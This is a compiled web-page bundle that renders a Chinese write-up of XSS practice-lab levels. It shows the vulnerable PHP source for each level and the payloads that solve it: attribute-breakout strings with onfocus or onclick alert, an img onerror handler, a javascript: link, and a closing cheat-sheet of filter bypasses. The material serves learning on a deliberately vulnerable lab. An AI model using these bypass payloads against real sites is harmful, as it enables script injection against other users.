important"}},[t._v("?>")])]),t._v("\n")])])]),s("p",[s("strong",[t._v("type")]),t._v(" "),s("strong",[t._v("hidden")])]),t._v(" "),s("p",[t._v("就是进行用户不必要的参数传递，或者说时为了保护传参的安全性")]),t._v(" "),s("p",[s("strong",[t._v("绕过")])]),t._v(" "),s("p",[t._v("将value闭合，后直接加type为可见的text，直接变成文本框可见")]),t._v(" "),s("p",[t._v("("),s("strong",[t._v('" onfocus=javascript:alert(/23/) type="text"')]),t._v(")")]),t._v(" "),s("h3",{attrs:{id:"_10-referer"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_10-referer"}},[t._v("#")]),t._v(" 10.referer:")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[t._v('<?php \nini_set("display_errors", 0);\n$str = $_GET["keyword"];\n$str00 = $_GET["t_sort"];\n$str11=$_SERVER[\'HTTP_REFERER\'];//获得referer请求头\n$str22=str_replace(">","",$str11);\n$str33=str_replace("<","",$str22);\necho "'),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("h2")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("align")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("center")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v('没有找到和".htmlspecialchars($str)."相关的结果.'),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("h2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\".'"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("center")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("form")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("id")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),t._v("search")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("t_link"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("  "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(".'"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("t_history"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("  "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(".'"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("t_sort"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("  "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(".htmlspecialchars($str00).'"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("input")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("t_ref"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v("  "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("'")]),t._v(".$str33.'"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),s("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("type")]),s("span",{pre:!0,attrs:{class:"token attr-value"}},[s("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("hidden"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("//ref接收referer\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),s("p",[t._v("所以直接抓包给referer传入就行")]),t._v(" "),s("p",[t._v("("),s("strong",[t._v('" onfocus=javascript:alert(/45/) type="text"')]),t._v(")")]),t._v(" "),s("h3",{attrs:{id:"_11-ua没的说"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_11-ua没的说"}},[t._v("#")]),t._v(" 11.UA没的说")]),t._v(" "),s("h3",{attrs:{id:"_12-cookie的构成"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_12-cookie的构成"}},[t._v("#")]),t._v(" 12.Cookie的构成")]),t._v(" "),s("p",[t._v("13题和之前的十二十一类似，但是要了解cookie的构成。")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[t._v("setcookie")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"user"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"call me maybe?"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("time")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("3600")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),s("p",[t._v("在浏览器中：")]),t._v(" "),s("p",[s("strong",[t._v("Cookie\t  user=call+me+maybe%3F")])]),t._v(" "),s("p",[t._v("所以要注意bp的构造格式")]),t._v(" "),s("h3",{attrs:{id:"_13-图片exif构造xss"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_13-图片exif构造xss"}},[t._v("#")]),t._v(" 13.图片exif构造xss")]),t._v(" "),s("p",[t._v("简单地说，就是exif的格式下的图片（"),s("strong",[t._v("原相机拍照，未经过处理")]),t._v("）会保存图片的一部分信心（包括创建时间，镜头制造商开定位还会暴露经纬度等等信息），这在xss的利用中就是修改这部分信息，写入脚本，在能读取exif图片信息的网站上传显示该图片信息，但是该网站也未对恶意脚本进行过滤（如果有，就是过滤尖括号），此时可以执行xss脚本，造成信息泄露。")]),t._v(" "),s("h3",{attrs:{id:"_14-文件包含"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_14-文件包含"}},[t._v("#")]),t._v(" 14.文件包含")]),t._v(" "),s("div",{staticClass:"language-ph extra-class"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("$str = $_GET[\"src\"];\necho '<body><span class=\"ng-include:'.htmlspecialchars($str).'\"></span></body>';\n")])])]),s("blockquote",[s("p",[t._v("1、ng-include 指令用于包含外部的 HTML文件。")])]),t._v(" "),s("p",[t._v("​      2、包含的内容将作为指定元素的子节点。")]),t._v(" "),s("p",[t._v("​\t  3、ng-include 属性的值可以是一个表达式，返回一个文件名。")]),t._v(" "),s("div",{staticClass:"language- extra-class"},[s("pre",[s("code",[t._v(" 4、默认情况下，包含的文件需要包含在同一个域名下。\n")])])]),s("blockquote",[s("p",[t._v("特别值得注意的几点如下：")])]),t._v(" "),s("p",[t._v("​\t\t1.ng-include,如果单纯指定地址，必须要加引号")]),t._v(" "),s("p",[t._v("​\t\t2.ng-include,加载外部html，script标签中的内容不执行")]),t._v(" "),s("p",[t._v("​\t\t3.ng-include,加载外部html中含有style标签样式可以识别")]),t._v(" "),s("p",[t._v("​\t\t所以只需要引用一个包含xss的文件就可以了")]),t._v(" "),s("p",[t._v("payload:")]),t._v(" "),s("div",{staticClass:"language-html extra-class"},[s("pre",{pre:!0,attrs:{class:"language-html"}},[s("code",[t._v('(src= \'level10.php?t_sort=" onclick=alert(/89/) type="text" >< \')\n  \n')])])]),s("h3",{attrs:{id:"_15-被过滤"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_15-被过滤"}},[t._v("#")]),t._v(" 15./被过滤")]),t._v(" "),s("p",[t._v("源码：")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v(" \n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("ini_set")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"display_errors"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("strtolower")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"keyword"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str2")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("str_replace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"script"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"&nbsp;"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//script /进行替换，同时空也被替换")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str3")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("str_replace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('" "')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"&nbsp;"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str4")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("str_replace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"/"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"&nbsp;"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str3")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str5")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("str_replace")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"\t"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"&nbsp;"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str4")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"<center>"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$str5")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"</center>"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("?>")])]),t._v("\n")])])]),s("p",[t._v("所以在这里只要是双标签都不能使用，同时由于&nbsp替换了空格（在属性中不能被解析，返回空），所以")]),t._v(" "),s("p",[t._v("只能将空格处换为%0a（换行）")]),t._v(" "),s("p",[t._v("单标签：img")]),t._v(" "),s("p",[t._v("😄"),s("img",{attrs:{rc:"",onerror:"javascript:alert('王登登的博客')"}})]),t._v(" "),s("p",[t._v("在图片出现错误时，执行onerror的js函数")]),t._v(" "),s("p",[t._v("单标签：input")]),t._v(" "),s("p",[t._v('<input type="submit" onfocus="😄java:alert(\'wangjingze\')";>')]),t._v(" "),s("p",[s("strong",[t._v("注意：")])]),t._v(" "),s("p",[t._v("onfocus以及onerror的值形式;")]),t._v(" "),s("p",[t._v("=")]),t._v(" "),s("ol",[s("li",[t._v("​\t”     前面随便写:alert(1)\t“,所以即使加了script也会执行")]),t._v(" "),s("li",[t._v('"\t😄alert(1)\t"')]),t._v(" "),s("li",[t._v("😄alert(1)")])]),t._v(" "),s("h1",{attrs:{id:"三、对于所有的xss类型做出总结-方便直接做题"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#三、对于所有的xss类型做出总结-方便直接做题"}},[t._v("#")]),t._v(" 三、对于所有的xss类型做出总结，方便直接做题")]),t._v(" "),s("h2",{attrs:{id:"_1-被ban"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-被ban"}},[t._v("#")]),t._v(" 1.<>被ban")]),t._v(" "),s("p",[t._v("(('onfocus=javascript:alert('90')")]),t._v(" "),s("p",[t._v("' onclick=javascript:alert(/88/) //针对单双引号不被使用，但是要求回显字符串。))")]),t._v(" "),s("p",[t._v("htmlspecialchars() 可用的引号类型：")]),t._v(" "),s("ul",[s("li",[t._v("ENT_COMPAT - "),s("strong",[t._v("==默认。仅编码双引号==")]),t._v("。")])]),t._v(" "),s("h2",{attrs:{id:"_2-on以及含有-script的过滤"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_2-on以及含有-script的过滤"}},[t._v("#")]),t._v(" 2.on以及含有<script的过滤")]),t._v(" "),s("p",[t._v("闭合前标签")]),t._v(" "),s("div",{staticClass:"language-php extra-class"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("a "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("smile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" hrf"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("javascript"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'wdd'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("alert "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("a"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])])])}),[],!1,null,null,null);s.default=r.exports}}]);